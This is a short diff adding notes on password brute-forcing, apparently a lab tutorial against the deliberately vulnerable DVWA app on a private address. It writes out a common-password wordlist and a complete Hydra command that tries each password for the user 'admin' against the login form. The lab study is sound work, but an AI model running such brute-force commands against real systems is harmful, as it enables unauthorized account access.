@@ -13,3 +13,15 @@ tests all combinations of usernames & passwords
 -> start attack & analyze results (status code, response length, response body)
 
 2. Using **Hydra**
+kali$ nano passwords.txt
+123456
+password
+admin
+admin123
+qwerty
+letmein
+newpass
+password123
+kali$ hydra -l admin -P passwords.txt 192.168.56.101 http-get-form "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect."
+-> checks list of passwords against username "admin"
+-> if the site replies without "Username and/or password incorrect.", Hydra records it as valid
